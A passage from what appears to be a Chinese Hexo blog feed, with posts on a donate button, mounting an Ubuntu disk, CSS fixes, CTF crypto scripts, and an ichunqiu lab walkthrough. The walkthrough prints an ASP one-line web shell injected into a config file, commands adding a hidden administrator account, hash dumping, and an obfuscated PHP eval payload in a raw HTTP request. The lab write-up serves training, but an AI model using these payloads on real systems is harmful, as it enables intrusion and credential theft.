class="attr">--</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> =<span class="string">&quot;post-donate&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;donate_board&quot;</span> <span class="attr">class</span>=<span class="string">&quot;donate_bar center&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;btn_donate&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn_donate&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:;&quot;</span> <span class="attr">title</span>=<span class="string">&quot;打赏&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;donate_txt&quot;</span>&gt;</span></span><br><span class="line">           <span class="symbol">&amp;uarr;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">%=theme.donate_message%</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;donate_guide&quot;</span> <span class="attr">class</span>=<span class="string">&quot;donate_bar center hidden&quot;</span> &gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 支付宝打赏图案 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/img/zhifubao.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;支付宝打赏&quot;</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- 微信打赏图案 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/img/weixin.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;微信打赏&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;btn_donate&#x27;</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">&#x27;#donate_board&#x27;</span>).addClass(<span class="string">&#x27;hidden&#x27;</span>);</span></span><br><span class="line"><span class="javascript">$(<span class="string">&#x27;#donate_guide&#x27;</span>).removeClass(<span class="string">&#x27;hidden&#x27;</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!</span> <span class="attr">--</span> 添加捐赠图标 <span class="attr">--</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="第二步-设置打赏模块样式"><a href="#第二步-设置打赏模块样式" class="headerlink" title="第二步: 设置打赏模块样式"></a>第二步: 设置打赏模块样式</h1><p><strong>source\css_partial</strong>目录下新建<strong>donate.styl</strong> 写入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.donate_bar</span> &#123;</span><br><span class="line"><span class="attribute">text-align</span>: center;</span><br><span class="line"><span class="attribute">margin-top</span>: <span class="number">5%</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.donate_bar</span> <span class="selector-tag">a</span><span class="selector-class">.btn_donate</span> &#123;</span><br><span class="line"><span class="attribute">display</span>: inline-block;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">82px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">82px</span>;</span><br><span class="line"><span class="attribute">margin-left</span>: auto;</span><br><span class="line"><span class="attribute">margin-right</span>: auto;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif)<span class="built_in">no-repeat</span>;</span><br><span class="line"><span class="attribute">-webkit-transition</span>: background <span class="number">0s</span>;</span><br><span class="line"><span class="attribute">-moz-transition</span>: background <span class="number">0s</span>;</span><br><span class="line"><span class="attribute">-o-transition</span>: background <span class="number">0s</span>;</span><br><span class="line"><span class="attribute">-ms-transition</span>: background <span class="number">0s</span>;</span><br><span class="line"><span class="attribute">transition</span>: background <span class="number">0s</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.donate_bar</span> <span class="selector-tag">a</span><span class="selector-class">.btn_donate</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line"><span class="attribute">background-position</span>: <span class="number">0</span> -<span class="number">82px</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.donate_bar</span> <span class="selector-class">.donate_txt</span> &#123;</span><br><span class="line"><span class="attribute">display</span>: block;</span><br><span class="line"><span class="attribute">color</span>: <span class="number">#9d9d9d</span>;</span><br><span class="line"><span class="attribute">font</span>: <span class="number">14px</span>/<span class="number">2</span> <span class="string">&quot;Microsoft Yahei&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.donate_bar</span><span class="selector-class">.hidden</span>&#123;</span><br><span class="line"><span class="attribute">display</span>: none</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.post-donate</span>&#123;</span><br><span class="line"><span class="attribute">margin-top</span>: <span class="number">80px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#donate_guide</span>&#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">210px</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">420px</span>;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#donate_guide</span> <span class="selector-tag">img</span>&#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完成以后 切记在    <strong>source\css\style.styl</strong>文件内添加<code>@import &#39;_partial/donate</code></p><h1 id="第三步-将模块整合到文章内"><a href="#第三步-将模块整合到文章内" class="headerlink" title="第三步: 将模块整合到文章内"></a>第三步: 将模块整合到文章内</h1><p>在<strong>layout_partial\article.ejs</strong>中的**<article> ……</article>**标签内部添加以下内容:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (!index &amp;&amp; theme.donate &amp;&amp; post.donate!=false)&#123; %&gt;</span><br><span class="line">&lt;%- partial(&#x27;donate&#x27;) %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><h1 id="最后-编写配置文件"><a href="#最后-编写配置文件" class="headerlink" title="最后: 编写配置文件"></a>最后: 编写配置文件</h1><p>我们可以在主题的** _config.yml** 文件中关闭和打开打赏功能，还可以自定义设置打赏文案。</p><figure class="highlight plain"><figcaption><span>code</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#是否开启打赏功能</span><br><span class="line">donate: true</span><br><span class="line">#打赏文案</span><br><span class="line">donate_message: 欣赏此文？求鼓励，求支持！</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果需要关掉打上功能只需要 在文章中加上<code>donate: false</code>即可~</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu系统新增硬盘空间</title>
      <link href="ubuntu-mount-new-disk.html"/>
      <url>ubuntu-mount-new-disk.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="ubuntu-添加新硬盘"><a href="#ubuntu-添加新硬盘" class="headerlink" title="ubuntu 添加新硬盘"></a>ubuntu 添加新硬盘</h1><p>查看硬盘：</p><pre><code># fdisk -l...Disk /dev/sdb: 274.9 GB, 274877906944 bytes255 heads, 63 sectors/track, 33418 cylinders, total     536870912 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000Disk /dev/sdb doesn&#39;t contain a valid partition table</code></pre><p>可以看到，有一块大小为256G的磁盘未初始化</p><p>格式化硬盘（如果需要多个分区，请先创建磁盘分区）：</p><pre><code># mkfs.ext4 /dev/sdbmke2fs 1.42.9 (4-Feb-2014)/dev/sdb is entire device, not just one partition!Proceed anyway? (y,n) yFilesystem label=OS type: LinuxBlock size=4096 (log=2)Fragment size=4096 (log=2)Stride=0 blocks, Stripe width=0 blocks16777216 inodes, 67108864 blocks3355443 blocks (5.00%) reserved for the super userFirst data block=0Maximum filesystem blocks=42949672962048 block groups32768 blocks per group, 32768 fragments per group8192 inodes per groupSuperblock backups stored on blocks:    32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208,    4096000, 7962624, 11239424, 20480000, 23887872Allocating group tables: doneWriting inode tables: doneCreating journal (32768 blocks): doneWriting superblocks and filesystem accounting information: done</code></pre><p>查看磁盘的UUID：</p><pre><code># blkid/dev/sda1: UUID=&quot;05003145-9b91-4943-aaa8-22cb496fd4d8&quot; TYPE=&quot;ext4&quot;/dev/sda5: UUID=&quot;ca0012ba-2bf1-4d0b-94d3-3e4043746a14&quot; TYPE=&quot;swap&quot;/dev/sdb: UUID=&quot;e23a1c1e-8d91-4df8-8fba-f0656a1080ab&quot; TYPE=&quot;ext4&quot;</code></pre><p>记录下/dev/sdb（刚才格式化的分区）的UUID。</p><p><em>注意：你看到的UUID的值与例子不同</em></p><p>编辑/etc/fstab</p><pre><code># editor /etc/fstab</code></pre><p>添加以下行</p><pre><code>UUID=e23a1c1e-8d91-4df8-8fba-f0656a1080ab    /home    ext4    defaults,errors=remount-ro    0    1</code></pre><p><strong><em>注意：UUID替换为上一步你获取到的值</em></strong></p><p><em>P.S.<code>/home</code>为你要挂载的目标目录</em></p><p>现在重启电脑，应用新的磁盘配置</p><pre><code># reboot</code></pre><p>查看磁盘配置：</p><pre><code># df -hFilesystem      Size  Used Avail Use% Mounted on/dev/sda1       8.8G  1.3G  7.1G  15% /none            4.0K     0  4.0K   0% /sys/fs/cgroupudev            8.2G  4.0K  8.2G   1% /devtmpfs           1.7G  492K  1.7G   1% /runnone            5.0M  8.0K  5.0M   1% /run/locknone            8.2G     0  8.2G   0% /run/shmnone            100M     0  100M   0% /run/user/dev/sdb        252G   60M  239G   1% /home</code></pre></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这是一波 ichunqiu在线挑战攻略 -(一)</title>
      <link href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"/>
      <url>%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="我很简单，不要欺负我"><a href="#我很简单，不要欺负我" class="headerlink" title="我很简单，不要欺负我"></a>我很简单，不要欺负我</h1><blockquote><ol><li>获取网站后台密码   </li><li>提取权限</li><li>获取服务器密码</li></ol></blockquote><h2 id="后台管理密码获取"><a href="#后台管理密码获取" class="headerlink" title="后台管理密码获取"></a>后台管理密码获取</h2><p>到处都是注入点 会用注入工具就能注入出账号密码了比如<strong>Domain</strong> /<strong>阿D</strong>/<strong>Pangolin</strong>/甚至是神器<strong>sqlmap</strong>都可以解决<br>详细过程我就跳过了 没什么意思 </p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>拿到账号密码后 应该是找后台的登陆页面<br>首先可以进行猜测  <code>admin</code> 比如这样就能自动跳出路径了</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-01" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-01"></a></p><p>进入后台后 应该是要想办法拿到shell<br>拿到shell方法有很多</p><ol><li>直接上传拿shell</li><li>数据库备份拿shell</li><li>突破本地上传拿shell</li><li>上传其他脚本类型拿shell</li><li>截断</li><li>服务器解析漏洞</li><li>利用编辑器</li><li>修改配置文件</li><li>修改网站模板</li></ol><p>找不到上传点好痛苦…看到配置文件可以修改 眼睛一亮  正好试试新到手都一句话木马能不能用</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-02" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-02"></a></p><p>点击左侧的[系统设置管理]→[网站配置信息]，随便找改地方插入一句话就好  如上图<br>之后用菜刀连接  我这里一句话是chr(97))  97是a的Ascii码 所以一句话密码是a<br><code>http://www.test.inchunqiu/inc/config.asp</code>这是连接地址<br>解释一下为什么是这里<br>/nc/config.asp 源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Const SiteName&#x3D;&quot;魅力企业网站管理系统 2007 中英繁商业正式版&quot;        &#39;网站名称</span><br><span class="line">Const EnSiteName&#x3D;&quot;MSCOM 2007&quot;        &#39;网站名称</span><br><span class="line">Const SiteTitle&#x3D;&quot;魅力软件&quot;        &#39;网站标题</span><br><span class="line">Const EnSiteTitle&#x3D;&quot;MelyySoft&quot;        &#39;网站标题</span><br><span class="line">Const SiteUrl&#x3D;&quot;www.melyysoft.com&quot;        &#39;网站地址</span><br><span class="line">Const Miibeian&#x3D;&quot;湘ICP备05011184号&quot;        &#39;网站备案号</span><br><span class="line">….</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>构造一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&gt;&lt;%Eval Request(Chr(97))%&gt;&lt;%&#39;</span><br></pre></td></tr></table></figure><p>插入一句话木马后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Const SiteName&#x3D;&quot;&quot;%&gt;&lt;%Eval Request(Chr(35))%&gt;&lt;% &#39;&quot;        &#39;网站名称</span><br><span class="line">Const EnSiteName&#x3D;&quot;MSCOM 2007&quot;        &#39;网站名称</span><br><span class="line">Const SiteTitle&#x3D;&quot;魅力软件&quot;        &#39;网站标题</span><br><span class="line">Const EnSiteTitle&#x3D;&quot;MelyySoft&quot;        &#39;网站标题</span><br><span class="line">Const SiteUrl&#x3D;&quot;www.melyysoft.com&quot;        &#39;网站地址</span><br><span class="line">Const Miibeian&#x3D;&quot;湘ICP备05011184号&quot;        &#39;网站备案号</span><br><span class="line">….</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>整理规范以后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Const SiteName&#x3D;&quot;&quot;%&gt;</span><br><span class="line">&lt;%Eval Request(Chr(35))%&gt;</span><br><span class="line">&lt;% &#39;&quot;        &#39;网站名称</span><br><span class="line">Const EnSiteName&#x3D;&quot;MSCOM 2007&quot;        &#39;网站名称</span><br><span class="line">Const SiteTitle&#x3D;&quot;魅力软件&quot;        &#39;网站标题</span><br><span class="line">Const EnSiteTitle&#x3D;&quot;MelyySoft&quot;        &#39;网站标题</span><br><span class="line">Const SiteUrl&#x3D;&quot;www.melyysoft.com&quot;        &#39;网站地址</span><br><span class="line">Const Miibeian&#x3D;&quot;湘ICP备05011184号&quot;        &#39;网站备案号</span><br><span class="line">….</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>所以插入一句话木马一定是要保证语法正确才能连接成功 所以一定要注意闭合<br>用菜刀连接刚刚的地址</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-03" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-03"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-04" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-04"></a></p><p>在这里上传 提权都工具  这里我选择使用<code>Pr</code></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-05" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-05"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-07" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-07"></a></p><p>上传成功后 右键<code>cmd.exe</code> 使用虚拟终端连接</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-06" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-06"></a></p><p>之后可以开始提权了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pr.exe &quot;net user hacker 123 &#x2F;add &amp; net localgroup administrators hacker &#x2F;add&quot;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-08" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-08"></a></p><p>看图的左下角 已经将<code>swing</code>这个账号加入到管理员组了 之后用3389连接就好了<br>打开[开始]→[运行]→输入<strong>mstsc</strong>连接到目标机就好了 (目标机IP可以在场景拓扑图里看到)<br>在这之前先打开 3389<br><code>pr 3389</code></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-09" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-09"></a></p><p>连接到目标机</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-10" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-10"></a></p><h2 id="获取服务器器管理密码"><a href="#获取服务器器管理密码" class="headerlink" title="获取服务器器管理密码"></a>获取服务器器管理密码</h2><p>这里我选择用<code>QuarksPwDum</code> 对Hash的获取</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-11" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-11"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-12" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-12"></a></p><p>使用图中的命令 打开工具<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-13" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-13"></a></p><p>成功打开<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-14" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-14"></a></p><p>使用命令获取hash</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-15" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-15"></a></p><p>成功获取hash 接下来要对hash进行解密 比如 [这个连接</p><p>](<a href="http://www.objectif-securite.ch/en/ophcrack.php">http://www.objectif-securite.ch/en/ophcrack.php</a>)<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-16" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-16"></a></p><p><strong>Good 这样就解决啦!!!</strong>  鼓掌一下</p><p>POST /utility/convert/index.php?a=config&amp;source=d7.2_x2.0 HTTP/1.1</p><p>Host: <a href="http://www.test.ichunqiu/">www.test.ichunqiu</a></p><p>User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:25.0) Gecko/20100101 Firefox/2X.0</p><p>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8</p><p>Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</p><p>Accept-Encoding: gzip, deflate</p><p>Connection: keep-alive</p><p>Content-Length: 199</p><p>Content-Type: application/x-www-form-urlencoded</p><p>newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa&amp;submit=yes</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次Hexo主题修改</title>
      <link href="%E8%AE%B0%E4%B8%80%E6%AC%A1Hexo%E4%B8%BB%E9%A2%98%E7%9A%84%E4%BF%AE%E6%94%B9.html"/>
      <url>%E8%AE%B0%E4%B8%80%E6%AC%A1Hexo%E4%B8%BB%E9%A2%98%E7%9A%84%E4%BF%AE%E6%94%B9.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>遇到了一个炒鸡难看的问题，对只是难看~</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-theme1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-theme1.png"></a></p><p>像这样~<br>还有这样</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-theme2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-theme2.png"></a></p><p>是不是特别丑  因为正常是只有外面那个滚轮的 那怎么解决呢 ~   我请教了一下一个朋友就带我用<code>F12开发者工具</code>调试了一波~   </p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>检查了一下 发现是<code>highlight </code>CSS中<code>Pre</code>的问题</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-theme3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-theme3.png"></a></p><p>如图当把这个去掉之后  滚轮就没了<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-3.png"></a>解决办法 </p><p>我有两个解决办法 暂时不知道有没有其他BUG  反正能解决这个问题就够了<br>首先 打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\themes\spfk\source\css\_partial</span><br></pre></td></tr></table></figure><p>路径下的这个文件   <code>highlight.styl</code></p><ol><li>方法一<br>应该是210 +左右的这个代码去掉 (或者你改大点) 这个参数限制了高度  所以造成了代码内还有一层上下都滚轮<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-6.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-6.png"></a></li><li>方法二<br>这方法比较粗暴 不建议<br>我将pre 的<code>padding:0</code>都删了 如图<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-7.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-7.png"></a><h1 id="最后-哗啦啦好啦"><a href="#最后-哗啦啦好啦" class="headerlink" title="最后 哗啦啦好啦"></a>最后 哗啦啦好啦</h1><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-9.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-9.png"></a></li></ol></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具以及脚本的整理</title>
      <link href="CTF-Misc-and-Crypto-Tools.html"/>
      <url>CTF-Misc-and-Crypto-Tools.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><code>整理一下工具和脚本以及他们的使用</code></p><h1 id="密码学-cryptology"><a href="#密码学-cryptology" class="headerlink" title="密码学 cryptology "></a>密码学 <code>cryptology </code></h1><p>各种密码学的在线解密<a href="http://www.practicalcryptography.com/">这</a></p><h2 id="简单的位移密码"><a href="#简单的位移密码" class="headerlink" title="简单的位移密码"></a>简单的位移密码</h2><p><code>默认位移13 即rot13</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">str =raw_input(<span class="string">&#x27;put flag:&#x27;</span>)</span><br><span class="line">new_str = <span class="string">&quot;&quot;</span></span><br><span class="line">yi = <span class="number">13</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line"><span class="keyword">if</span> i&gt;=<span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> i&lt;=<span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">i = ord(i)</span><br><span class="line">i = ((i-yi)<span class="number">-97</span>)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line">i = chr(i)</span><br><span class="line">new_str = new_str+i</span><br><span class="line">print(new_str)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h2><p>培根是根据字体的斜体 大小写转化成AB等字符 